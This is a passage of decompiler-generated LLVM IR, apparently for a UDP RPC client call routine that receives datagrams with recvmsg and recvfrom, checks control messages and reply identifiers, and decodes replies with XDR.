  br i1 %v1_8055941, label %dec_label_pc_8055b94, label %dec_label_pc_8055947

dec_label_pc_8055947:                             ; preds = %dec_label_pc_805590f
  %v0_805593c = load i32, i32* @esp, align 4
  %v1_805593c = add i32 %v0_805593c, 16
  %v3_8055947 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8055a6a, i32* %edx.global-to-local, align 4
  %v2_805594d = udiv i32 %v3_8055947, 32
  %tmp200 = icmp ult i32 %v3_8055947, 32
  store i32 %v2_805594d, i32* @edi, align 4
  %tmp132158 = icmp eq i1 %tmp200, false
  br i1 %tmp132158, label %dec_label_pc_8055958, label %dec_label_pc_8055b94

dec_label_pc_8055958:                             ; preds = %dec_label_pc_8055947, %dec_label_pc_805599c
  %stack_var_-9016.3161 = phi i32 [ %v4_805599c, %dec_label_pc_805599c ], [ %v2_8055a6a, %dec_label_pc_8055947 ]
  %v0_8055958160 = phi i32 [ %v3_8055979, %dec_label_pc_805599c ], [ %v3_8055937, %dec_label_pc_8055947 ]
  %v1_8055958159 = phi i32 [ %v1_805597e, %dec_label_pc_805599c ], [ %v1_805593c, %dec_label_pc_8055947 ]
  %v2_8055958 = add i32 %v1_8055958159, -4
  %v3_8055958 = inttoptr i32 %v2_8055958 to i32*
  store i32 %v0_8055958160, i32* %v3_8055958, align 4
  %v1_8055959 = add i32 %v1_8055958159, -8
  %v2_8055959 = inttoptr i32 %v1_8055959 to i32*
  store i32 32, i32* %v2_8055959, align 4
  %v5_805595b = add i32 %v1_8055958159, -12
  %v6_805595b = inttoptr i32 %v5_805595b to i32*
  store i32 %stack_var_-9016.3161, i32* %v6_805595b, align 4
  store i32 %v2_8055961, i32* @ebx, align 4
  %v2_8055964 = add i32 %v1_8055958159, -16
  %v3_8055964 = inttoptr i32 %v2_8055964 to i32*
  store i32 %v2_8055961, i32* %v3_8055964, align 4
  %v3_8055965 = inttoptr i32 %stack_var_-9016.3161 to i16*
  %v4_8055965 = call i32 @memcpy(i16* %v3_8055965, i32 %v0_8055912, i32 %stack_var_-9008.2)
  store i32 %v4_8055965, i32* %eax.global-to-local, align 4
  %v0_805596a = load i32, i32* @esp, align 4
  %v2_805596d = add i32 %v0_805596a, 8
  %v3_805596d = inttoptr i32 %v2_805596d to i32*
  store i32 %v2_8055961, i32* %v3_805596d, align 4
  %v1_805596e = add i32 %v0_805596a, 4
  %v2_805596e = inttoptr i32 %v1_805596e to i32*
  store i32 35091, i32* %v2_805596e, align 4
  %v6_8055973 = inttoptr i32 %v0_805596a to i32*
  store i32 %v0_8055912, i32* %v6_8055973, align 4
  %v3_8055979 = call i32 @ioctl(i32 %stack_var_-9016.3161, i32 %v0_8055912, i32 %stack_var_-9008.2)
  store i32 %v3_8055979, i32* %eax.global-to-local, align 4
  %v0_805597e = load i32, i32* @esp, align 4
  %v1_805597e = add i32 %v0_805597e, 16
  %v2_8055981 = icmp slt i32 %v3_8055979, 0
  br i1 %v2_8055981, label %dec_label_pc_8055b94, label %dec_label_pc_8055989

dec_label_pc_8055989:                             ; preds = %dec_label_pc_8055958
  br i1 %v5_8055989, label %dec_label_pc_805599c, label %dec_label_pc_805598f

dec_label_pc_805598f:                             ; preds = %dec_label_pc_8055989
  store i32 %stack_var_-9016.3161, i32* %ecx.global-to-local, align 4
  %v1_8055995 = add i32 %stack_var_-9016.3161, 16
  %v2_8055995 = inttoptr i32 %v1_8055995 to i16*
  %v3_8055995 = load i16, i16* %v2_8055995, align 4
  %v12_8055995 = icmp eq i16 %v3_8055995, 2
  br i1 %v12_8055995, label %dec_label_pc_80559ad, label %dec_label_pc_805599c

dec_label_pc_805599c:                             ; preds = %dec_label_pc_805598f, %dec_label_pc_8055989
  %v4_805599c = add i32 %stack_var_-9016.3161, 32
  %v0_80559a3 = load i32, i32* @edi, align 4
  %v1_80559a3 = add i32 %v0_80559a3, -1
  store i32 %v1_80559a3, i32* @edi, align 4
  %tmp131 = icmp slt i32 %v1_80559a3, 1
  %tmp132 = icmp eq i1 %tmp131, false
  br i1 %tmp132, label %dec_label_pc_8055958, label %dec_label_pc_8055b94

dec_label_pc_80559ad:                             ; preds = %dec_label_pc_805598f
  %v0_80559ad = load i32, i32* @esi, align 4
  %v1_80559ad = add i32 %v0_80559ad, 28
  %v2_80559ad = inttoptr i32 %v1_80559ad to i32*
  %v3_80559ad = load i32, i32* %v2_80559ad, align 4
  store i32 %v3_80559ad, i32* @ebx, align 4
  %v5_80559b0 = add i32 %v3_80559ad, %stack_var_-9004.2
  %v1_80559b6 = add i32 %v0_80559ad, 32
  %v2_80559b6 = inttoptr i32 %v1_80559b6 to i32*
  %v3_80559b6 = load i32, i32* %v2_80559b6, align 4
  store i32 %v3_80559b6, i32* %eax.global-to-local, align 4
  %v5_80559b9 = add i32 %v3_80559b6, %stack_var_-9008.2
  %v4_80559d1162 = add i32 %v5_80559b9, -999999
  %v9_80559d1163 = sub i32 999998, %v5_80559b9
  %v10_80559d1164 = and i32 %v9_80559d1163, %v5_80559b9
  %v11_80559d1165 = icmp slt i32 %v10_80559d1164, 0
  %v12_80559d1166 = icmp eq i32 %v4_80559d1162, 0
  %v13_80559d1167 = icmp slt i32 %v4_80559d1162, 0
  %v3_80559db168 = icmp eq i1 %v13_80559d1167, %v11_80559d1165
  %v4_80559db169 = icmp eq i1 %v12_80559d1166, false
  %v5_80559db170 = and i1 %v4_80559db169, %v3_80559db168
  br i1 %v5_80559db170, label %dec_label_pc_80559c1, label %dec_label_pc_80559dd

dec_label_pc_80559c1:                             ; preds = %dec_label_pc_80559ad, %dec_label_pc_80559c1
  %stack_var_-9004.3172 = phi i32 [ %v4_80559c1, %dec_label_pc_80559c1 ], [ %v5_80559b0, %dec_label_pc_80559ad ]
  %storemerge7.in171 = phi i32 [ %v4_80559c7, %dec_label_pc_80559c1 ], [ %v5_80559b9, %dec_label_pc_80559ad ]
  %v4_80559c1 = add i32 %stack_var_-9004.3172, 1
  %v4_80559c7 = add i32 %storemerge7.in171, -1000000
  %v4_80559d1 = add i32 %storemerge7.in171, -1999999
  %v9_80559d1 = sub i32 1999998, %storemerge7.in171
  %v10_80559d1 = and i32 %v9_80559d1, %v4_80559c7
  %v11_80559d1 = icmp slt i32 %v10_80559d1, 0
  %v12_80559d1 = icmp eq i32 %v4_80559d1, 0
  %v13_80559d1 = icmp slt i32 %v4_80559d1, 0
  %v3_80559db = icmp eq i1 %v13_80559d1, %v11_80559d1
  %v4_80559db = icmp eq i1 %v12_80559d1, false
  %v5_80559db = and i1 %v4_80559db, %v3_80559db
  br i1 %v5_80559db, label %dec_label_pc_80559c1, label %dec_label_pc_80559dd

dec_label_pc_80559dd:                             ; preds = %dec_label_pc_80559c1, %dec_label_pc_80559ad
  %storemerge7.in.lcssa = phi i32 [ %v5_80559b9, %dec_label_pc_80559ad ], [ %v4_80559c7, %dec_label_pc_80559c1 ]
  %stack_var_-9004.3.lcssa = phi i32 [ %v5_80559b0, %dec_label_pc_80559ad ], [ %v4_80559c1, %dec_label_pc_80559c1 ]
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v5_80559e9 = icmp slt i32 %stack_var_-9004.3.lcssa, %storemerge3
  br i1 %v5_80559e9, label %dec_label_pc_8055875, label %dec_label_pc_80559ef

dec_label_pc_80559ef:                             ; preds = %dec_label_pc_80559dd
  %v15_80559e3 = icmp eq i32 %stack_var_-9004.3.lcssa, %storemerge3
  %v1_80559ef = icmp eq i1 %v15_80559e3, false
  br i1 %v1_80559ef, label %dec_label_pc_8055a03, label %dec_label_pc_80559f1

dec_label_pc_80559f1:                             ; preds = %dec_label_pc_80559ef
  store i32 %stack_var_-9000.0, i32* %ecx.global-to-local, align 4
  %v5_80559fd = icmp slt i32 %storemerge7.in.lcssa, %stack_var_-9000.0
  br i1 %v5_80559fd, label %dec_label_pc_8055875, label %dec_label_pc_8055a03

dec_label_pc_8055a03:                             ; preds = %dec_label_pc_80559f1, %dec_label_pc_80559ef, %dec_label_pc_80558a8.dec_label_pc_8055a03_crit_edge
  %v0_8055a08 = phi i32 [ %v0_8055a08.pre, %dec_label_pc_80558a8.dec_label_pc_8055a03_crit_edge ], [ %v0_80559ad, %dec_label_pc_80559ef ], [ %v0_80559ad, %dec_label_pc_80559f1 ]
  store i32 5, i32* %eax.global-to-local, align 4
  %v1_8055a08 = add i32 %v0_8055a08, 44
  %v2_8055a08 = inttoptr i32 %v1_8055a08 to i32*
  store i32 5, i32* %v2_8055a08, align 4
  br label %dec_label_pc_8055c7f

dec_label_pc_8055a14:                             ; preds = %dec_label_pc_80558e9
  %v1_8055a14 = call i32 @__errno_location(i32 %stack_var_-9008.2)
  store i32 %v1_8055a14, i32* %eax.global-to-local, align 4
  %v1_8055a19 = inttoptr i32 %v1_8055a14 to i32*
  %v2_8055a19 = load i32, i32* %v1_8055a19, align 4
  store i32 %v2_8055a19, i32* %eax.global-to-local, align 4
  %v1_8055a1b = add i32 %v2_8055a19, -4
  br label %dec_label_pc_8055b8b

dec_label_pc_8055a23:                             ; preds = %dec_label_pc_8055907
  br i1 %v5_8055a23, label %dec_label_pc_8055b4d, label %dec_label_pc_8055a2d

dec_label_pc_8055a2d:                             ; preds = %dec_label_pc_8055a23
  store i32 %stack_var_-9028.2, i32* @ebx, align 4
  %v2_8055a4e = sub i32 %v1_80558fb, %v1_8055a41
  store i32 %v2_8055a50, i32* %stack_var_-8980, align 4
  %v1_8055a5c = add i32 %v2_8055a4e, 15
  %v1_8055a66 = and i32 %v1_8055a5c, -16
  store i32 %v1_8055a66, i32* %edx.global-to-local, align 4
  %v2_8055a69 = add i32 %v2_8055a4e, -4
  %v3_8055a69 = inttoptr i32 %v2_8055a69 to i32*
  store i32 %v2_8055a59, i32* %v3_8055a69, align 4
  store i32 %v2_8055a6a, i32* %eax.global-to-local, align 4
  %v1_8055a70 = add i32 %v2_8055a4e, -8
  %v2_8055a70 = inttoptr i32 %v1_8055a70 to i32*
  store i32 8192, i32* %v2_8055a70, align 4
  %v0_8055a75 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055a75 = add i32 %v0_8055a75, 256
  store i32 %v1_8055a75, i32* @edi, align 4
  %v2_8055a7b = add i32 %v2_8055a4e, -12
  %v3_8055a7b = inttoptr i32 %v2_8055a7b to i32*
  store i32 %v2_8055a6a, i32* %v3_8055a7b, align 4
  %v0_8055a7c = load i32, i32* @edi, align 4
  store i32 %v0_8055a7c, i32* %stack_var_-36, align 4
  %v0_8055a93 = load i32, i32* %edx.global-to-local, align 4
  %v0_8055aa3 = load i32, i32* @esi, align 4
  %v1_8055aa3 = inttoptr i32 %v0_8055aa3 to i32*
  %v2_8055aa3 = load i32, i32* %v1_8055aa3, align 4
  %v4_8055aa3 = add i32 %v2_8055a4e, -16
  %v5_8055aa3 = inttoptr i32 %v4_8055aa3 to i32*
  store i32 %v2_8055aa3, i32* %v5_8055aa3, align 4
  %v0_8055aa5 = load i32, i32* %stack_var_-8980, align 4
  %v3_8055aa5 = call i32 @__libc_recvmsg(i32 %v0_8055aa5, i32 16, i32 %v2_8055a59)
  store i32 %v3_8055aa5, i32* %eax.global-to-local, align 4
  %v0_8055aaa = load i32, i32* @esp, align 4
  %v1_8055aaa = add i32 %v0_8055aaa, 16
  store i32 %v3_8055aa5, i32* @ebx, align 4
  %v2_8055aaf = icmp slt i32 %v3_8055aa5, 0
  br i1 %v2_8055aaf, label %dec_label_pc_8055b4d, label %dec_label_pc_8055ab7

dec_label_pc_8055ab7:                             ; preds = %dec_label_pc_8055a2d
  %v2_8055ab7 = add i32 %v0_8055aaa, 12
  %v3_8055ab7 = inttoptr i32 %v2_8055ab7 to i32*
  store i32 %v3_8055aa5, i32* %v3_8055ab7, align 4
  %v0_8055ab8 = load i32, i32* @ebx, align 4
  %v2_8055ab8 = add i32 %v0_8055aaa, 8
  %v3_8055ab8 = inttoptr i32 %v2_8055ab8 to i32*
  store i32 %v0_8055ab8, i32* %v3_8055ab8, align 4
  %v0_8055ab9 = load i32, i32* @esi, align 4
  %v1_8055ab9 = add i32 %v0_8055ab9, 88
  %v2_8055ab9 = inttoptr i32 %v1_8055ab9 to i32*
  %v3_8055ab9 = load i32, i32* %v2_8055ab9, align 4
  %v5_8055ab9 = add i32 %v0_8055aaa, 4
  %v6_8055ab9 = inttoptr i32 %v5_8055ab9 to i32*
  store i32 %v3_8055ab9, i32* %v6_8055ab9, align 4
  %v0_8055abc = load i32, i32* @edi, align 4
  %v3_8055abc = inttoptr i32 %v0_8055aaa to i32*
  store i32 %v0_8055abc, i32* %v3_8055abc, align 4
  %v0_8055abd = call i32 @bcmp()
  store i32 %v0_8055abd, i32* %eax.global-to-local, align 4
  %v0_8055ac2 = load i32, i32* @esp, align 4
  %v1_8055ac2 = add i32 %v0_8055ac2, 16
  %v1_8055ac5 = icmp eq i32 %v0_8055abd, 0
  %v1_8055ac7 = icmp eq i1 %v1_8055ac5, false
  br i1 %v1_8055ac7, label %dec_label_pc_8055b4d, label %dec_label_pc_8055acd

dec_label_pc_8055acd:                             ; preds = %dec_label_pc_8055ab7
  br i1 %v5_8055acd, label %dec_label_pc_8055b4d, label %dec_label_pc_8055ad6

dec_label_pc_8055ad6:                             ; preds = %dec_label_pc_8055acd
  store i32 16, i32* %eax.global-to-local, align 4
  %v3_8055aec = load i16, i16* %stack_var_-76, align 2
  %v14_8055aec = icmp eq i16 %v3_8055aec, 2
  %v1_8055af1 = icmp eq i1 %v14_8055aec, false
  br i1 %v1_8055af1, label %dec_label_pc_8055b4d, label %dec_label_pc_8055af3

dec_label_pc_8055af3:                             ; preds = %dec_label_pc_8055ad6
  %v0_8055af3 = load i32, i32* @esi, align 4
  %v1_8055af3 = add i32 %v0_8055af3, 12
  store i32 %v1_8055af3, i32* %eax.global-to-local, align 4
  %v0_8055af6 = load i32, i32* @ecx, align 4
  %v2_8055af6 = add i32 %v0_8055ac2, 12
  %v3_8055af6 = inttoptr i32 %v2_8055af6 to i32*
  store i32 %v0_8055af6, i32* %v3_8055af6, align 4
  %v1_8055af7 = add i32 %v0_8055ac2, 8
  %v2_8055af7 = inttoptr i32 %v1_8055af7 to i32*
  store i32 4, i32* %v2_8055af7, align 4
  %v0_8055af9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055af9 = add i32 %v0_8055ac2, 4
  %v3_8055af9 = inttoptr i32 %v2_8055af9 to i32*
  store i32 %v0_8055af9, i32* %v3_8055af9, align 4
  store i32 %v2_8055afa, i32* %eax.global-to-local, align 4
  %v3_8055afd = inttoptr i32 %v0_8055ac2 to i32*
  store i32 %v2_8055afa, i32* %v3_8055afd, align 4
  %v0_8055afe = call i32 @bcmp()
  store i32 %v0_8055afe, i32* %eax.global-to-local, align 4
  %v0_8055b03 = load i32, i32* @esp, align 4
  %v1_8055b03 = add i32 %v0_8055b03, 16
  %v1_8055b06 = icmp eq i32 %v0_8055afe, 0
  %v1_8055b08 = icmp eq i1 %v1_8055b06, false
  br i1 %v1_8055b08, label %dec_label_pc_8055b4d, label %dec_label_pc_8055b0a

dec_label_pc_8055b0a:                             ; preds = %dec_label_pc_8055af3
  %v6_8055b0a = and i32 %v0_8055afe, -65536
  %v7_8055b0a = or i32 %v6_8055b0a, %v4_8055b0a
  store i32 %v7_8055b0a, i32* %eax.global-to-local, align 4
  %v2_8055b0e = load i32, i32* @esi, align 4
  %v3_8055b0e = add i32 %v2_8055b0e, 10
  %v4_8055b0e = inttoptr i32 %v3_8055b0e to i16*
  %v5_8055b0e = load i16, i16* %v4_8055b0e, align 2
  %v16_8055b0e = icmp eq i16 %tmp79, %v5_8055b0e
  %v1_8055b12 = icmp eq i1 %v16_8055b0e, false
  br i1 %v1_8055b12, label %dec_label_pc_8055b4d, label %dec_label_pc_8055b14

dec_label_pc_8055b14:                             ; preds = %dec_label_pc_8055b0a
  store i32 %v0_8055a93, i32* %eax.global-to-local, align 4
  %v1_8055b4936 = icmp eq i32 %v0_8055a93, 0
  %v1_8055b4b43 = icmp eq i1 %v1_8055b4936, false
  br i1 %v1_8055b4b43, label %dec_label_pc_8055b27, label %dec_label_pc_8055b4d

dec_label_pc_8055b27:                             ; preds = %dec_label_pc_8055b14, %dec_label_pc_8055b37
  %v1_8055b37 = phi i32 [ %v1_8055b46, %dec_label_pc_8055b37 ], [ %v1_8055b03, %dec_label_pc_8055b14 ]
  %v0_805578e = phi i32 [ %v0_8055b41, %dec_label_pc_8055b37 ], [ %v0_8055a93, %dec_label_pc_8055b14 ]
  %v1_8055b27 = add i32 %v0_805578e, 4
  %v2_8055b27 = inttoptr i32 %v1_8055b27 to i32*
  %v3_8055b27 = load i32, i32* %v2_8055b27, align 4
  %v4_8055b27 = icmp eq i32 %v3_8055b27, 0
  %v1_8055b2b = icmp eq i1 %v4_8055b27, false
  br i1 %v1_8055b2b, label %dec_label_pc_8055b37, label %dec_label_pc_8055b2d

dec_label_pc_8055b2d:                             ; preds = %dec_label_pc_8055b27
  %v1_8055b2d = add i32 %v0_805578e, 8
  %v2_8055b2d = inttoptr i32 %v1_8055b2d to i32*
  %v3_8055b2d = load i32, i32* %v2_8055b2d, align 4
  %v12_8055b2d = icmp eq i32 %v3_8055b2d, 11
  br i1 %v12_8055b2d, label %dec_label_pc_805578e, label %dec_label_pc_8055b37

dec_label_pc_8055b37:                             ; preds = %dec_label_pc_8055b2d, %dec_label_pc_8055b27
  %v0_8055b37 = load i32, i32* @edx, align 4
  %v2_8055b37 = add i32 %v1_8055b37, -4
  %v3_8055b37 = inttoptr i32 %v2_8055b37 to i32*
  store i32 %v0_8055b37, i32* %v3_8055b37, align 4
  %v0_8055b38 = load i32, i32* @edx, align 4
  %v2_8055b38 = add i32 %v1_8055b37, -8
  %v3_8055b38 = inttoptr i32 %v2_8055b38 to i32*
  store i32 %v0_8055b38, i32* %v3_8055b38, align 4
  %v0_8055b39 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055b39 = add i32 %v1_8055b37, -12
  %v3_8055b39 = inttoptr i32 %v2_8055b39 to i32*
  store i32 %v0_8055b39, i32* %v3_8055b39, align 4
  store i32 %v2_8055a6a, i32* %eax.global-to-local, align 4
  %v2_8055b40 = add i32 %v1_8055b37, -16
  %v3_8055b40 = inttoptr i32 %v2_8055b40 to i32*
  store i32 %v2_8055a6a, i32* %v3_8055b40, align 4
  %v0_8055b41 = call i32 @__cmsg_nxthdr()
  store i32 %v0_8055b41, i32* %eax.global-to-local, align 4
  %v0_8055b46 = load i32, i32* @esp, align 4
  %v1_8055b46 = add i32 %v0_8055b46, 16
  %v1_8055b49 = icmp eq i32 %v0_8055b41, 0
  %v1_8055b4b = icmp eq i1 %v1_8055b49, false
  br i1 %v1_8055b4b, label %dec_label_pc_8055b27, label %dec_label_pc_8055b4d

dec_label_pc_8055b4d:                             ; preds = %dec_label_pc_8055b0a, %dec_label_pc_8055af3, %dec_label_pc_8055ad6, %dec_label_pc_8055acd, %dec_label_pc_8055ab7, %dec_label_pc_8055a2d, %dec_label_pc_8055a23, %dec_label_pc_8055b14, %dec_label_pc_8055b37, %dec_label_pc_8055b77.dec_label_pc_8055b4d_crit_edge
  %v1_8055b50 = phi i32 [ %v1_8055b50.pre, %dec_label_pc_8055b77.dec_label_pc_8055b4d_crit_edge ], [ %v1_8055b03, %dec_label_pc_8055b14 ], [ %v1_8055b03, %dec_label_pc_8055b0a ], [ %v1_8055b03, %dec_label_pc_8055af3 ], [ %v1_8055ac2, %dec_label_pc_8055ad6 ], [ %v1_8055ac2, %dec_label_pc_8055acd ], [ %v1_8055ac2, %dec_label_pc_8055ab7 ], [ %v1_8055aaa, %dec_label_pc_8055a2d ], [ %v1_80558fb, %dec_label_pc_8055a23 ], [ %v1_8055b46, %dec_label_pc_8055b37 ]
  %v0_8055b50 = phi i32 [ %v1_8055b77, %dec_label_pc_8055b77.dec_label_pc_8055b4d_crit_edge ], [ %v0_8055a93, %dec_label_pc_8055b14 ], [ %v7_8055b0a, %dec_label_pc_8055b0a ], [ %v0_8055afe, %dec_label_pc_8055af3 ], [ 16, %dec_label_pc_8055ad6 ], [ %v0_8055abd, %dec_label_pc_8055acd ], [ %v0_8055abd, %dec_label_pc_8055ab7 ], [ %v3_8055aa5, %dec_label_pc_8055a2d ], [ %v0_80558f6, %dec_label_pc_8055a23 ], [ %v0_8055b41, %dec_label_pc_8055b37 ]
  store i32 %v2_8055b4d, i32* %edx.global-to-local, align 4
  %v2_8055b50 = add i32 %v1_8055b50, -4
  %v3_8055b50 = inttoptr i32 %v2_8055b50 to i32*
  store i32 %v0_8055b50, i32* %v3_8055b50, align 4
  %v0_8055b51 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055b51 = add i32 %v1_8055b50, -8
  %v3_8055b51 = inttoptr i32 %v2_8055b51 to i32*
  store i32 %v0_8055b51, i32* %v3_8055b51, align 4
  store i32 %v2_8055b52, i32* %eax.global-to-local, align 4
  %v2_8055b55 = add i32 %v1_8055b50, -12
  %v3_8055b55 = inttoptr i32 %v2_8055b55 to i32*
  store i32 %v2_8055b52, i32* %v3_8055b55, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v2_8055b5d = add i32 %v1_8055b50, -16
  %v3_8055b5d = inttoptr i32 %v2_8055b5d to i32*
  store i32 %v2_8055b4d, i32* %v3_8055b5d, align 4
  %v1_8055b5e = add i32 %v1_8055b50, -20
  %v2_8055b5e = inttoptr i32 %v1_8055b5e to i32*
  store i32 0, i32* %v2_8055b5e, align 4
  %v0_8055b60 = load i32, i32* @esi, align 4
  %v1_8055b60 = add i32 %v0_8055b60, 92
  %v2_8055b60 = inttoptr i32 %v1_8055b60 to i32*
  %v3_8055b60 = load i32, i32* %v2_8055b60, align 4
  %v5_8055b60 = add i32 %v1_8055b50, -24
  %v6_8055b60 = inttoptr i32 %v5_8055b60 to i32*
  store i32 %v3_8055b60, i32* %v6_8055b60, align 4
  %v0_8055b63 = load i32, i32* @esi, align 4
  %v1_8055b63 = add i32 %v0_8055b63, 96
  store i32 %v1_8055b63, i32* @ebx, align 4
  %v2_8055b66 = add i32 %v1_8055b50, -28
  %v3_8055b66 = inttoptr i32 %v2_8055b66 to i32*
  store i32 %v1_8055b63, i32* %v3_8055b66, align 4
  %v0_8055b67 = load i32, i32* @esi, align 4
  %v1_8055b67 = inttoptr i32 %v0_8055b67 to i32*
  %v2_8055b67 = load i32, i32* %v1_8055b67, align 4
  %v4_8055b67 = add i32 %v1_8055b50, -32
  %v5_8055b67 = inttoptr i32 %v4_8055b67 to i32*
  store i32 %v2_8055b67, i32* %v5_8055b67, align 4
  %v0_8055b69 = load i32, i32* %stack_var_-20, align 4
  %v4_8055b69 = load i32, i32* %stack_var_-4, align 4
  %v5_8055b69 = load i32, i32* %stack_var_0, align 4
  %v6_8055b69 = call i32 @__libc_recvfrom(i32 %v0_8055b69, i32 %v0_8055735, i32 %v0_8055734, i32 %v0_8055733, i32 %v4_8055b69, i32 %v5_8055b69)
  store i32 %v6_8055b69, i32* %eax.global-to-local, align 4
  %v0_8055b6e = load i32, i32* @esp, align 4
  %v1_8055b6e = add i32 %v0_8055b6e, 32
  store i32 %v6_8055b69, i32* @ecx, align 4
  %v2_8055b73 = icmp slt i32 %v6_8055b69, 0
  %v1_8055b75 = icmp eq i1 %v2_8055b73, false
  br i1 %v1_8055b75, label %dec_label_pc_8055ba5, label %dec_label_pc_8055b77

dec_label_pc_8055b77:                             ; preds = %dec_label_pc_8055b4d
  %v0_8055b77 = load i32, i32* %stack_var_-20, align 4
  %v1_8055b77 = call i32 @__errno_location(i32 %v0_8055b77)
  store i32 %v1_8055b77, i32* %eax.global-to-local, align 4
  %v1_8055b7c = inttoptr i32 %v1_8055b77 to i32*
  %v2_8055b7c = load i32, i32* %v1_8055b7c, align 4
  %v11_8055b7c = icmp eq i32 %v2_8055b7c, 4
  br i1 %v11_8055b7c, label %dec_label_pc_8055b77.dec_label_pc_8055b4d_crit_edge, label %dec_label_pc_8055b81

dec_label_pc_8055b77.dec_label_pc_8055b4d_crit_edge: ; preds = %dec_label_pc_8055b77
  %v1_8055b50.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055b4d

dec_label_pc_8055b81:                             ; preds = %dec_label_pc_8055b77
  %v0_8055b81 = load i32, i32* %stack_var_-20, align 4
  %v1_8055b81 = call i32 @__errno_location(i32 %v0_8055b81)
  store i32 %v1_8055b81, i32* %eax.global-to-local, align 4
  %v1_8055b86 = inttoptr i32 %v1_8055b81 to i32*
  %v2_8055b86 = load i32, i32* %v1_8055b86, align 4
  store i32 %v2_8055b86, i32* %eax.global-to-local, align 4
  %v1_8055b88 = add i32 %v2_8055b86, -11
  br label %dec_label_pc_8055b8b

dec_label_pc_8055b8b:                             ; preds = %dec_label_pc_8055a14, %dec_label_pc_8055b81
  %v0_8055b9176 = phi i32 [ %v2_8055a19, %dec_label_pc_8055a14 ], [ %v2_8055b86, %dec_label_pc_8055b81 ]
  %storemerge8.in = phi i32 [ %v1_8055a1b, %dec_label_pc_8055a14 ], [ %v1_8055b88, %dec_label_pc_8055b81 ]
  %storemerge8 = icmp eq i32 %storemerge8.in, 0
  br i1 %storemerge8, label %dec_label_pc_8055b8b.dec_label_pc_80558e9.backedge_crit_edge, label %dec_label_pc_8055b91

dec_label_pc_8055b8b.dec_label_pc_80558e9.backedge_crit_edge: ; preds = %dec_label_pc_8055b8b
  %v0_80558e9.pre.pre = load i32, i32* @ecx, align 4
  %v1_80558e9.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80558e9

dec_label_pc_8055b91:                             ; preds = %dec_label_pc_8055b8b, %dec_label_pc_805578e
  %v0_8055b91 = phi i32 [ %v3_805578e, %dec_label_pc_805578e ], [ %v0_8055b9176, %dec_label_pc_8055b8b ]
  %v1_8055b91 = load i32, i32* @esi, align 4
  %v2_8055b91 = add i32 %v1_8055b91, 48
  %v3_8055b91 = inttoptr i32 %v2_8055b91 to i32*
  store i32 %v0_8055b91, i32* %v3_8055b91, align 4
  br label %dec_label_pc_8055b94

dec_label_pc_8055b94:                             ; preds = %dec_label_pc_805590f, %dec_label_pc_8055947, %dec_label_pc_8055958, %dec_label_pc_805599c, %dec_label_pc_8055b91
  store i32 4, i32* %eax.global-to-local, align 4
  %v0_8055b99 = load i32, i32* @esi, align 4
  %v1_8055b99 = add i32 %v0_8055b99, 44
  %v2_8055b99 = inttoptr i32 %v1_8055b99 to i32*
  store i32 4, i32* %v2_8055b99, align 4
  br label %dec_label_pc_8055c7f

dec_label_pc_8055ba5:                             ; preds = %dec_label_pc_8055b4d
  %v7_8055ba8 = icmp sgt i32 %v6_8055b69, 3
  br i1 %v7_8055ba8, label %dec_label_pc_8055bae, label %dec_label_pc_80558e9

dec_label_pc_8055bae:                             ; preds = %dec_label_pc_8055ba5
  br i1 %v4_80557d9, label %dec_label_pc_8055bc2, label %dec_label_pc_8055bb4

dec_label_pc_8055bb4:                             ; preds = %dec_label_pc_8055bae
  %v0_8055bb4 = load i32, i32* @esi, align 4
  %v1_8055bb4 = add i32 %v0_8055bb4, 88
  %v2_8055bb4 = inttoptr i32 %v1_8055bb4 to i32*
  %v3_8055bb4 = load i32, i32* %v2_8055bb4, align 4
  store i32 %v3_8055bb4, i32* %edx.global-to-local, align 4
  %v1_8055bb7 = add i32 %v0_8055bb4, 96
  %v2_8055bb7 = inttoptr i32 %v1_8055bb7 to i32*
  %v3_8055bb7 = load i32, i32* %v2_8055bb7, align 4
  store i32 %v3_8055bb7, i32* %eax.global-to-local, align 4
  %v2_8055bba = inttoptr i32 %v3_8055bb4 to i32*
  %v3_8055bba = load i32, i32* %v2_8055bba, align 4
  %v14_8055bba = icmp eq i32 %v3_8055bb7, %v3_8055bba
  %v1_8055bbc = icmp eq i1 %v14_8055bba, false
  br i1 %v1_8055bbc, label %dec_label_pc_80558e9, label %dec_label_pc_8055bc2

dec_label_pc_8055bc2:                             ; preds = %dec_label_pc_8055bb4, %dec_label_pc_8055bae
  %v1_8055bc2 = add i32 %v0_8055b6e, 28
  %v2_8055bc2 = inttoptr i32 %v1_8055bc2 to i32*
  store i32 1, i32* %v2_8055bc2, align 4
  %v0_8055bc4 = load i32, i32* @ecx, align 4
  %v2_8055bc4 = add i32 %v0_8055b6e, 24
  %v3_8055bc4 = inttoptr i32 %v2_8055bc4 to i32*
  store i32 %v0_8055bc4, i32* %v3_8055bc4, align 4
  %v0_8055bc5 = load i32, i32* @ebx, align 4
  %v2_8055bc5 = add i32 %v0_8055b6e, 20
  %v3_8055bc5 = inttoptr i32 %v2_8055bc5 to i32*
  store i32 %v0_8055bc5, i32* %v3_8055bc5, align 4
  store i32 %v2_8055bc6, i32* @ebx, align 4
  %v2_8055bc9 = add i32 %v0_8055b6e, 16
  %v3_8055bc9 = inttoptr i32 %v2_8055bc9 to i32*
  store i32 %v2_8055bc6, i32* %v3_8055bc9, align 4
  %v0_8055bca = load i32, i32* %stack_var_-20, align 4
  %v4_8055bca = inttoptr i32 %v0_8055bca to i32*
  %v5_8055bca = call i32 @__GI_xdrmem_create(i32* %v4_8055bca, i32 %v0_8055735, i32 %v0_8055734, i32 %v0_8055733)
  store i32 %v5_8055bca, i32* %eax.global-to-local, align 4
  %v0_8055bcf = load i32, i32* @esp, align 4
  %v1_8055bcf = inttoptr i32 %v0_8055bcf to i32*
  %v3_8055bcf = add i32 %v0_8055bcf, 4
  store i32 %v2_8055bd0, i32* @edi, align 4
  %v1_8055bd6 = inttoptr i32 %v3_8055bcf to i32*
  %v2_8055bd6 = load i32, i32* %v1_8055bd6, align 4
  store i32 %v2_8055bd6, i32* @eax, align 4
  store i32 %v2_8055bd0, i32* %v1_8055bd6, align 4
  store i32 %v2_8055bc6, i32* %v1_8055bcf, align 4
